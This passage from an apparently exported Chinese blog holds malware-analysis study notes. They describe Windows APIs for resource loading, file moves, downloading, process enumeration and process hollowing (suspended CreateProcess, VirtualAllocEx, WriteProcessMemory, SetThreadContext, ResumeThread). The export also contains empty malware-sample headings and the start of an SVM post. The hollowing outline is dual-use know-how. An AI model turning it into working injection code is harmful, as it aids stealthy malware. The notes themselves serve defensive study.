<li><p><code>FindResource</code> 函数：</p>
<ul>
<li><strong>用途</strong>：在可执行文件（或 DLL）的资源表中<strong>查找指定的资源</strong>。</li>
<li><strong>参数</strong>：<ul>
<li><code>hModule</code>：指定包含资源的模块的句柄，通常是可执行文件或 DLL 的句柄。如果为 <code>NULL</code>，表示使用当前可执行文件或 DLL。</li>
<li><code>lpName</code>：指定资源的<strong>名称或标识符</strong>。</li>
<li><code>lpType</code>：指定资源的<strong>类型</strong>。</li>
</ul>
</li>
<li><strong>返回值</strong>：如果函数调用成功，返回指向资源的句柄；否则返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><code>LoadResource</code> 函数：</p>
<ul>
<li><strong>用途</strong>：加载指定资源的内容，返回资源的句柄。</li>
<li><strong>参数</strong>：<ul>
<li><code>hModule</code>：指定包含资源的模块的句柄，通常是可执行文件或 DLL 的句柄。如果为 <code>NULL</code>，表示使用当前可执行文件或 DLL。</li>
<li><code>hResInfo</code>：指定资源的句柄，可以使用 <code>FindResource</code> 函数获取。</li>
</ul>
</li>
<li><strong>返回值</strong>：如果函数调用成功，返回指向资源的句柄；否则返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><code>LockResource</code> 函数：</p>
<ul>
<li><strong>用途</strong>：锁定 <code>LoadResource</code> 返回的资源句柄，返回资源的指针。</li>
<li><strong>参数</strong>：<ul>
<li><code>hResData</code>：指向资源的句柄，通常是 <code>LoadResource</code> 函数的返回值。</li>
</ul>
</li>
<li><strong>返回值</strong>：如果函数调用成功，返回指向资源数据的指针；否则返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><code>SizeofResource</code> 函数：</p>
<ul>
<li><strong>用途</strong>：获取指定资源的大小。</li>
<li><strong>参数</strong>：<ul>
<li><code>hModule</code>：指定包含资源的模块的句柄，通常是可执行文件或 DLL 的句柄。如果为 <code>NULL</code>，表示使用当前可执行文件或 DLL。</li>
<li><code>hResInfo</code>：指定资源的句柄，可以使用 <code>FindResource</code> 函数获取。</li>
</ul>
</li>
<li><strong>返回值</strong>：如果函数调用成功，返回资源的大小；否则返回 0。</li>
</ul>
</li>
<li><p><code>VirtualAlloc</code> 函数：</p>
<ul>
<li>用途：在进程的虚拟地址空间中分配内存。</li>
<li>参数：<ul>
<li><code>lpAddress</code>：指定要分配的内存的首选地址。如果为 <code>NULL</code>，系统将自动选择一个地址。</li>
<li><code>dwSize</code>：指定要分配的内存的大小（以字节为单位）。</li>
<li><code>flAllocationType</code>：指定内存分配的类型和属性，例如 <code>MEM_COMMIT</code>、<code>MEM_RESERVE</code>、<code>MEM_RESET</code> 等。</li>
<li><code>flProtect</code>：指定内存保护属性，例如 <code>PAGE_READWRITE</code>、<code>PAGE_EXECUTE_READ</code> 等。</li>
</ul>
</li>
<li>返回值：如果函数调用成功，返回指向分配内存的首地址的指针；否则返回 <code>NULL</code>。</li>
</ul>
</li>
<li><p><code>FreeResource</code> 函数：</p>
<ul>
<li><strong>用途</strong>：释放由 <code>FindResource</code>、<code>LoadResource</code> 和 <code>LockResource</code> 函数加载的资源。</li>
<li><strong>参数</strong>：<ul>
<li><code>hResData</code>：指向资源的句柄，通常是 <code>LoadResource</code> 函数的返回值。</li>
</ul>
</li>
<li><strong>返回值</strong>：无。</li>
</ul>
</li>
</ol>
<p>这些函数通常在处理和操作可执行文件或 DLL 中的资源时使用。它们允许你查找、加载、访问和释放资源的内容。</p>
<p><strong>实例</strong>：</p>
<p><img src="C:\Users\qidan\AppData\Roaming\Typora\typora-user-images\image-20230913171304978.png" alt="image-20230913171304978"></p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="进程源文件的移动"><a href="#进程源文件的移动" class="headerlink" title="进程源文件的移动"></a>进程源文件的移动</h3><blockquote>
<p>主要用于源文件的替换操作，先把源文件放到temp目录下。涉及到的API有： <code>GetWindowsDirectoryA、GetTempPathA、 snprintf、MoveFileA</code>。</p>
</blockquote>
<ul>
<li><code>GetWindowsDirectoryA</code>：该函数用于获取 Windows 操作系统的安装目录。</li>
<li><code>GetTempPathA</code>：该函数用于获取临时文件夹的路径。</li>
<li><code>snprintf</code>：<code>snprintf</code> 是一个 C 标准库函数，用于将格式化的数据写入字符串缓冲区。</li>
<li><code>MoveFileA</code>：该函数用于重命名或移动文件或目录。</li>
</ul>
<h3 id="网络下载到文件"><a href="#网络下载到文件" class="headerlink" title="网络下载到文件"></a>网络下载到文件</h3><blockquote>
<p>用于从网络下载数据到指定文件，进行软件更新。</p>
</blockquote>
<p><code>URLDownloadToFile</code> 函数：</p>
<p>函数功能：它可以从指定的 URL 下载文件，并将其保存到本地文件系统中的指定位置。</p>
<p>函数格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HRESULT <span class="title function_">URLDownloadToFile</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPUNKNOWN            pCaller,</span></span><br><span class="line"><span class="params">  LPCWSTR              szURL,</span></span><br><span class="line"><span class="params">  LPCWSTR              szFileName,</span></span><br><span class="line"><span class="params">  DWORD                dwReserved,</span></span><br><span class="line"><span class="params">  LPBINDSTATUSCALLBACK lpfnCB</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数</strong>：</p>
<ul>
<li><code>pCaller</code>: 指向 <code>IUnknown</code> 接口的指针，可以为 <code>NULL</code>。</li>
<li><code>szURL</code>: 要下载的文件的 URL 地址。</li>
<li><code>szFileName</code>: 下载的文件保存的本地路径和文件名。</li>
<li><code>dwReserved</code>: 保留参数，必须为 0。</li>
<li><code>lpfnCB</code>: 指向 <code>IBindStatusCallback</code> 接口的指针，用于接收下载进度回调，可以为 <code>NULL</code>。</li>
</ul>
<p><strong>返回值</strong>：函数返回值为 <code>HRESULT</code> 类型的值，用于表示操作的结果。如果函数调用成功，返回值为 <code>S_OK</code>，否则可能返回其他错误代码。</p>
<p><strong>歌曰</strong>：<code>URLDownloadToFile</code> 函数已被标记为过时（deprecated），不推荐在新的应用程序中使用。在现代的 Windows 系统中，推荐使用更强大和灵活的网络库或框架，如 <code>WinINet、WinHTTP、CURL</code> 等来进行文件下载操作。</p>
<h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><h2 id="网络连接操作"><a href="#网络连接操作" class="headerlink" title="网络连接操作"></a>网络连接操作</h2><h2 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h2><blockquote>
<p>创建（挂起）- 进程替换、打开进程-获取句柄、遍历操作-搜索指定进程、创建线程-进程注入。</p>
</blockquote>
<h3 id="遍历操作-搜索指定进程"><a href="#遍历操作-搜索指定进程" class="headerlink" title="遍历操作-搜索指定进程"></a>遍历操作-搜索指定进程</h3><blockquote>
<p>一般是<code>psapi.dll</code> 提供的一组函数。可以查询系统中的进程和模块信息，这些函数可以用于编写诸如<strong>进程监视、进程注入、进程枚举</strong>等类型的系统工具和应用程序。</p>
</blockquote>
<ul>
<li><code>EnumProcesses</code>：枚举系统中正在运行的进程。</li>
<li><code>EnumProcessModules</code>：枚举指定进程中加载的模块。</li>
<li><code>GetModuleBaseName</code>：获取指定进程中模块的基本名称。</li>
<li><code>GetModuleFileNameEx</code>：获取指定进程中模块的完整路径。</li>
<li><code>GetModuleInformation</code>：获取指定进程中模块的详细信息。</li>
<li><code>GetProcessImageFileName</code>：获取指定进程的可执行文件路径。</li>
<li><code>GetProcessId</code>：获取指定进程的进程 ID。</li>
<li><code>GetProcessTimes</code>：获取指定进程的运行时间和 CPU 时间等。</li>
</ul>
<p>下面主要细致介绍下前三个函数：</p>
<ol>
<li><p><code>EnumProcesses</code>函数介绍：</p>
<p><strong>函数功能</strong>：用于枚举系统中正在运行的进程。</p>
<p><strong>函数格式</strong>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumProcesses</span><span class="params">(</span></span><br><span class="line"><span class="params">  DWORD   *lpidProcess,</span></span><br><span class="line"><span class="params">  DWORD   cb,</span></span><br><span class="line"><span class="params">  DWORD   *lpcbNeeded</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数</strong>：</p>
<ul>
<li><code>lpidProcess</code>：指向一个接收进程 ID 列表的数组的指针。调用该函数时，数组将被填充为系统中正在运行的进程的 ID。每个进程 ID 都是一个 <code>DWORD</code> 类型的值。</li>
<li><code>cb</code>：指定 <code>lpidProcess</code> 数组的大小，以字节为单位。</li>
<li><code>lpcbNeeded</code>：指向一个变量的指针，用于接收函数执行所需的实际字节数。如果传入的 <code>cb</code> 小于所需的大小，则此变量将包含所需的大小值</li>
</ul>
<p><strong>返回值</strong>：返回值为 <code>BOOL</code> 类型，表示函数执行的成功或失败。如果函数成功执行，则返回值为非零；如果函数失败，则返回值为零。</p>
<p><strong>实际例子</strong>：</p>
<p><img src="C:\Users\qidan\AppData\Roaming\Typora\typora-user-images\image-20230912165300260.png" alt="image-20230912165300260"></p>
</li>
<li><p><code>EnumProcessModules</code>函数：</p>
<p><strong>函数功能</strong>：枚举指定进程中加载的模块（DLL），存储句柄。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumProcessModules</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  HMODULE *lphModule,</span></span><br><span class="line"><span class="params">  DWORD   cb,</span></span><br><span class="line"><span class="params">  LPDWORD lpcbNeeded</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数：</strong></p>
<ul>
<li><code>hProcess</code>：指定要枚举模块的进程的句柄。通常使用 <code>OpenProcess</code> 函数打开进程并获取句柄。</li>
<li><code>lphModule</code>：指向存储模块句柄的数组的指针。调用该函数时，数组将被填充为进程中加载的模块的句柄。每个模块句柄是一个 <code>HMODULE</code> 类型的值。</li>
<li><code>cb</code>：指定 <code>lphModule</code> 数组的大小，以字节为单位。</li>
<li><code>lpcbNeeded</code>：指向一个变量的指针，用于接收函数执行所需的实际字节数。如果传入的 <code>cb</code> 小于所需的大小，则此变量将包含所需的大小值。</li>
</ul>
<p><strong>返回值</strong>：返回值为 <code>BOOL</code> 类型，表示函数执行的成功或失败。如果函数成功执行，则返回值为非零；如果函数失败，则返回值为零。</p>
</li>
<li><p><code>GetModuleBaseNameA</code>函数：</p>
<p><strong>函数功能</strong>：用于获取指定进程中模块的基本名称（即模块的文件名）</p>
<p><strong>函数格式</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">GetModuleBaseNameA</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  HMODULE hModule,</span></span><br><span class="line"><span class="params">  LPSTR   lpBaseName,</span></span><br><span class="line"><span class="params">  DWORD   nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数</strong>：</p>
<ul>
<li><code>hProcess</code>：指定要获取模块名称的进程的句柄。通常使用 <code>OpenProcess</code> 函数打开进程并获取句柄。</li>
<li><code>hModule</code>：指定要获取基本名称的模块的句柄。如果指定 <code>NULL</code>，则返回主模块（即进程的可执行文件）的基本名称。</li>
<li><code>lpBaseName</code>：指向接收基本名称的字符缓冲区的指针。</li>
<li><code>nSize</code>：指定接收基本名称的字符缓冲区的大小，以字节为单位。</li>
</ul>
<p><strong>返回值</strong>：返回值为 <code>DWORD</code> 类型，表示实际复制到缓冲区中的字符数，不包括终止 null 字符。如果函数失败，则返回值为 0。</p>
<p><strong>实践一下</strong>：</p>
<p><img src="C:\Users\qidan\AppData\Roaming\Typora\typora-user-images\image-20230912171212640.png" alt="image-20230912171212640"></p>
<p><strong>歌曰：</strong></p>
<p><code>GetModuleBaseNameA</code> 是 ANSI 版本的函数，适用于使用 ANSI 字符集的应用程序。如果需要使用 Unicode 字符集，可以使用 <code>GetModuleBaseNameW</code> 函数。</p>
</li>
</ol>
<h3 id="进程创建与进程替换"><a href="#进程创建与进程替换" class="headerlink" title="进程创建与进程替换"></a>进程创建与进程替换</h3><blockquote>
<p>这部分主要是进程替换过程中涉及的函数，包括：<code>CreateProcess</code>、<code>VirtualAlloc</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、<code>RssumeThread</code>。</p>
</blockquote>
<ol>
<li><p><code>CreateProcess</code>函数：</p>
<p><strong>函数功能</strong>：用于创建新的进程。它可以创建一个新的进程并且启动执行指定的可执行文件。</p>
<p><strong>函数格式</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPCWSTR               lpApplicationName,</span></span><br><span class="line"><span class="params">  LPWSTR                lpCommandLine,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  BOOL                  bInheritHandles,</span></span><br><span class="line"><span class="params">  DWORD                 dwCreationFlags,</span></span><br><span class="line"><span class="params">  LPVOID                lpEnvironment,</span></span><br><span class="line"><span class="params">  LPCWSTR               lpCurrentDirectory,</span></span><br><span class="line"><span class="params">  LPSTARTUPINFOW        lpStartupInfo,</span></span><br><span class="line"><span class="params">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数</strong>：</p>
<ul>
<li><code>lpApplicationName</code>：可执行文件的路径或文件名。</li>
<li><code>lpCommandLine</code>：命令行参数。</li>
<li><code>lpProcessAttributes</code>：进程对象的安全属性，可以为<code>NULL</code>。</li>
<li><code>lpThreadAttributes</code>：线程对象的安全属性，可以为<code>NULL</code>。</li>
<li><code>bInheritHandles</code>：指定新进程是否继承父进程的句柄。</li>
<li><code>dwCreationFlags</code>：指定创建进程的标志和选项。<code>dwCreationFlags</code> 参数设置 <code>CREATE_SUSPENDED</code> 标志表示挂起。</li>
<li><code>lpEnvironment</code>：新进程的环境变量，可以为<code>NULL</code>。</li>
<li><code>lpCurrentDirectory</code>：新进程的当前工作目录，可以为<code>NULL</code>。</li>
<li><code>lpStartupInfo</code>：指向<code>STARTUPINFOW</code>结构的指针，用于指定新进程的启动信息。</li>
<li><code>lpProcessInformation</code>：指向<code>PROCESS_INFORMATION</code>结构的指针，用于接收新进程的信息。</li>
</ul>
<p><strong>返回值</strong>：函数返回值为<code>BOOL</code>类型，表示函数调用是否成功。如果函数成功，返回值为<code>TRUE</code>，否则返回值为<code>FALSE</code>。</p>
</li>
<li><p><code>VirtualAllocEx</code>函数</p>
<p><strong>函数功能：</strong>  </p>
<p><code>VirtualAllocEx函数</code>用于<strong>在指定的外部进程中分配内存空间</strong>。它允许一个进程分配内存，而该内存可以在不同的进程之间共享。这个函数的常见用途之一是在<strong>远程进程中注入代码或数据</strong>。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LPVOID <span class="title function_">VirtualAllocEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE hProcess,</span></span><br><span class="line"><span class="params">  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  DWORD  flAllocationType,</span></span><br><span class="line"><span class="params">  DWORD  flProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数：</strong></p>
<ul>
<li>hProcess：要分配内存的<strong>目标进程的句柄</strong>。</li>
<li>lpAddress：指定分配内存的<strong>起始地址</strong>，如果为NULL，则由系统自动选择。</li>
<li>dwSize：要分配的<strong>内存大小</strong>，以字节为单位。</li>
<li>flAllocationType：内存<strong>分配类型</strong>的标志，指定内存的使用方式，例如MEM_COMMIT表示立即提交内存，MEM_RESERVE表示保留内存。</li>
<li>flProtect：<strong>内存保护标志</strong>，指定内存区域的访问权限，例如PAGE_READWRITE表示可读写。</li>
</ul>
<p><strong>返回值：</strong></p>
<p>VirtualAllocEx函数的返回值是<strong>分配的内存的起始地址</strong>。如果分配内存失败，返回值为NULL。可以使用GetLastError函数获取更多关于失败原因的信息。</p>
</li>
<li><p><code>WriteProcessMemory</code>函数</p>
<p><strong>函数功能：</strong></p>
<p><code>WriteProcessMemory</code>函数用于在指定的外部进程中写入数据。它允许<strong>一个进程将数据写入其他进程的分配的内存空间</strong>。这个函数的常见用途之一是在远程进程中修改数据或注入代码。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  LPVOID  lpBaseAddress,</span></span><br><span class="line"><span class="params">  LPCVOID lpBuffer,</span></span><br><span class="line"><span class="params">  SIZE_T  nSize,</span></span><br><span class="line"><span class="params">  SIZE_T  *lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数：</strong></p>
<ul>
<li>hProcess：要写入数据的<strong>目标进程的句柄</strong>。</li>
<li>lpBaseAddress：要写入数据的<strong>内存地址</strong>。</li>
<li>lpBuffer：指向要写入的<strong>数据缓冲区</strong>的指针。</li>
<li>nSize：要写入的<strong>数据大小</strong>，以字节为单位。</li>
<li>lpNumberOfBytesWritten：指向保存实际<strong>写入字节数</strong>的变量的指针。</li>
</ul>
<p><strong>返回值：</strong></p>
<p>WriteProcessMemory函数的返回值是一个<strong>BOOL类型的值</strong>，表示写入操作是否成功。如果写入成功，返回值为非零；如果写入失败，返回值为零。可以使用GetLastError函数获取更多关于失败原因的信息。</p>
</li>
<li><p><code>GetThreadContext</code> 函数:</p>
<p><strong>函数功能</strong>：用于获取指定线程的上下文信息。</p>
<p><strong>函数格式</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">GetThreadContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE    hThread,</span></span><br><span class="line"><span class="params">  LPCONTEXT lpContext</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hThread</code>：要获取上下文信息的目标线程的句柄。</li>
<li><code>lpContext</code>：指向 <code>CONTEXT</code> 结构体的指针，用于接收线程的上下文信息。</li>
</ul>
<p><strong>流程</strong>：调用 <code>GetThreadContext</code> 函数时，传递目标线程的句柄和指向 <code>CONTEXT</code> 结构体的指针。函数将填充指定的 <code>CONTEXT</code> 结构体，以提供有关线程的寄存器值、标志寄存器状态、堆栈指针等信息。</p>
</li>
<li><p><code>SetThreadContext</code>函数：</p>
<p><strong>函数功能</strong>：用于设置指定线程的上下文信息，包括寄存器值、标志位等。（在这里一般用于设置入口点）</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetThreadContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE hThread,</span></span><br><span class="line"><span class="params">  <span class="type">const</span> CONTEXT *lpContext</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数：</strong></p>
<ul>
<li><code>hThread</code>：要设置上下文的线程句柄。</li>
<li><code>lpContext</code>：指向<code>CONTEXT</code>结构的指针，包含要设置的上下文信息。</li>
</ul>
<p><strong>返回值：</strong>函数返回值为<code>BOOL</code>类型，表示函数调用是否成功。如果函数成功，返回值为<code>TRUE</code>，否则返回值为<code>FALSE</code>。</p>
</li>
<li><p><code>RssumeThread</code>函数：</p>
<p><strong>函数功能</strong>：用于恢复被挂起的线程的执行。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">ResumeThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE hThread</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>函数参数：</strong></p>
<ul>
<li><code>hThread</code>：要恢复执行的线程句柄。</li>
</ul>
<p><strong>返回值：</strong>函数返回值为线程的先前挂起计数。如果函数调用失败，返回值为<code>DWORD</code>类型的错误代码。</p>
</li>
</ol>
<p><strong>总结</strong>：一般是连环使用，先是创建一个挂起的进程，之后清空数据再替换数据，然后修改入口点最后启动进程。</p>
<hr>
<p><code>Createprocess</code>创建与上下文的扩展：</p>
<ol>
<li><p><strong>挂起态创建</strong>：</p>
<p>在使用该函数创建一个新的进程的时候，可以指定dwCreationFlags参数为4，表示挂起该进程，直到使用<code>RssumeThread</code>函数才进行执行；</p>
</li>
<li><p><code>IpStartupinfo</code>参数介绍：</p>
<p>该参数是一个结构体，指定新进程的启动信息。下面是该结构体的定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">  DWORD  cb;</span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>cb</code>：结构体的大小，以字节为单位，用于指定结构体的版本。</li>
<li><code>lpReserved</code>：保留字段，未使用，应设置为 <code>NULL</code>。</li>
<li><code>lpDesktop</code>：新进程要使用的桌面名称，通常为 <code>NULL</code> 表示使用默认桌面。</li>
<li><code>lpTitle</code>：新进程的窗口标题，可以为 <code>NULL</code>。</li>
<li><code>dwX</code>、<code>dwY</code>：新进程的初始窗口左上角的屏幕坐标。</li>
<li><code>dwXSize</code>、<code>dwYSize</code>：新进程的初始窗口的宽度和高度。</li>
<li><code>dwXCountChars</code>、<code>dwYCountChars</code>：新进程的控制台窗口的字符单元数。</li>
<li><code>dwFillAttribute</code>：控制台窗口的填充属性。</li>
<li><code>dwFlags</code>：指定启动标志，例如 <code>STARTF_USESHOWWINDOW</code>、<code>STARTF_USESTDHANDLES</code> 等。</li>
<li><code>wShowWindow</code>：指定新进程的窗口如何显示，如 <code>SW_SHOW</code>、<code>SW_HIDE</code> 等。</li>
<li><code>cbReserved2</code>、<code>lpReserved2</code>：保留字段，未使用，应设置为 0 或 <code>NULL</code>。</li>
<li><code>hStdInput</code>、<code>hStdOutput</code>、<code>hStdError</code>：指定新进程的标准输入、输出和错误句柄。</li>
</ul>
<p>所以我们可以先以挂起态创建某进程，再修改该结构体内容。</p>
</li>
<li><p><code>IpProcessInformation</code>参数介绍：</p>
<p>用于接收新进程的信息，该结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">  HANDLE hProcess;</span><br><span class="line">  HANDLE hThread;</span><br><span class="line">  DWORD  dwProcessId;</span><br><span class="line">  DWORD  dwThreadId;</span><br><span class="line">&#125; PROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hProcess</code>：新<strong>进程的句柄</strong>，用于操作和管理该进程。</li>
<li><code>hThread</code>：新进程的<strong>主线程句柄</strong>，用于操作和管理该主线程。</li>
<li><code>dwProcessId</code>：新进程的<strong>进程标识符</strong>（Process ID）。</li>
<li><code>dwThreadId</code>：新进程的<strong>主线程标识符</strong>（Thread ID）。</li>
</ul>
</li>
<li><p><code>IpContext</code>介绍：</p>
<p><code>CONTEXT</code> 结构体用于保存和描述线程的上下文信息，下面是结构体定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line">  DWORD   ContextFlags;</span><br><span class="line">  DWORD   Dr0;</span><br><span class="line">  DWORD   Dr1;</span><br><span class="line">  DWORD   Dr2;</span><br><span class="line">  DWORD   Dr3;</span><br><span class="line">  DWORD   Dr6;</span><br><span class="line">  DWORD   Dr7;</span><br><span class="line">  FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">  DWORD   SegGs;</span><br><span class="line">  DWORD   SegFs;</span><br><span class="line">  DWORD   SegEs;</span><br><span class="line">  DWORD   SegDs;</span><br><span class="line">  DWORD   Edi;</span><br><span class="line">  DWORD   Esi;</span><br><span class="line">  DWORD   Ebx;</span><br><span class="line">  DWORD   Edx;</span><br><span class="line">  DWORD   Ecx;</span><br><span class="line">  DWORD   Eax;</span><br><span class="line">  DWORD   Ebp;</span><br><span class="line">  DWORD   Eip;</span><br><span class="line">  DWORD   SegCs;</span><br><span class="line">  DWORD   EFlags;</span><br><span class="line">  DWORD   Esp;</span><br><span class="line">  DWORD   SegSs;</span><br><span class="line">  BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT, *PCONTEXT;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ContextFlags</code>：用于指定上下文中包含的特定标志。</li>
<li><code>Dr0</code> 至 <code>Dr7</code>：调试寄存器，用于保存调试相关的信息。</li>
<li><code>FloatSave</code>：浮点寄存器的保存区域。</li>
<li><code>SegGs</code> 至 <code>SegSs</code>：段寄存器，用于保存段选择子。</li>
<li><code>Edi</code> 至 <code>Eax</code>：通用寄存器，用于保存通用数据。</li>
<li><code>Ebp</code>：基址指针寄存器，指向当前栈帧的基址。</li>
<li><code>Eip</code>：指令指针寄存器，存储下一条要执行的指令的地址。</li>
<li><code>SegCs</code>：代码段寄存器，保存当前代码段的选择子。</li>
<li><code>EFlags</code>：标志寄存器，包含了一些特定的控制和状态标志。</li>
<li><code>Esp</code>：堆栈指针寄存器，指向当前栈顶的地址。</li>
<li><code>SegSs</code>：堆栈段寄存器，保存当前堆栈段的选择子。</li>
<li><code>ExtendedRegisters</code>：用于保存扩展寄存器的数据。</li>
</ul>
<p>通过传递一个指向 <code>CONTEXT</code> 结构体的指针作为参数，可以<strong>获取或设置</strong>线程的上下文信息。这些信息包括<strong>寄存器的值、标志寄存器的状态、堆栈指针、代码指针</strong>等。</p>
</li>
</ol>
<p>​	</p>
<h1 id="熊猫烧香样本"><a href="#熊猫烧香样本" class="headerlink" title="熊猫烧香样本"></a>熊猫烧香样本</h1><h1 id="魔窟样本"><a href="#魔窟样本" class="headerlink" title="魔窟样本"></a>魔窟样本</h1><h1 id="Mydoom样本"><a href="#Mydoom样本" class="headerlink" title="Mydoom样本"></a>Mydoom样本</h1><h1 id="大黄蜂样本"><a href="#大黄蜂样本" class="headerlink" title="大黄蜂样本"></a>大黄蜂样本</h1><h1 id="游蛇样本"><a href="#游蛇样本" class="headerlink" title="游蛇样本"></a>游蛇样本</h1><hr>
<blockquote>
<p><strong>写在最后</strong>：这是<strong>不断更新</strong>的一章，后续分析各种家族样本与书籍示例时都会学习到新的API，会以样本为分类进行记录。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-专业知识-】恶意代码分析与处置</category>
        <category>分析方法论</category>
      </categories>
      <tags>
        <tag>恶意代码</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习算法之支持向量机算法</title>
    <url>/2023/03/30/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E4%B9%8B%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：本文会介绍SVM的相关知识，参考：<a href="https://github.com/NLP-LOVE/ML-NLP/blob/master/Machine%20Learning/4.%20SVM/4.%20SVM.md">https://github.com/NLP-LOVE/ML-NLP/blob/master/Machine%20Learning/4.%20SVM/4.%20SVM.md</a></p>
</blockquote>
<h1 id="SVM介绍"><a href="#SVM介绍" class="headerlink" title="SVM介绍"></a>SVM介绍</h1><h2 id="SVM要解决什么问题？"><a href="#SVM要解决什么问题？" class="headerlink" title="SVM要解决什么问题？"></a>SVM要解决什么问题？</h2><p>下面用一个天使与魔鬼的故事介绍一下SVM到底是要解决什么问题：</p>
<p>传说魔鬼和天使玩了一个游戏，魔鬼在桌上放了两种颜色的球。魔鬼让天使用一根木棍将它们分开。这对天使来说，似乎太容易了。天使不假思索地一摆，便完成了任务。魔鬼又加入了更多的球。随着球的增多，似乎有的球不能再被原来的木棍正确分开，如下图所示。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1679140940037.png"></p>
<p>SVM实际上是在为天使<strong>找到木棒的最佳放置位置</strong>，使得两边的球都离分隔它们的木棒足够远。依照SVM为天使选择的木棒位置，魔鬼即使按刚才的方式继续加入新球，木棒也能很好地将两类不同的球分开。</p>
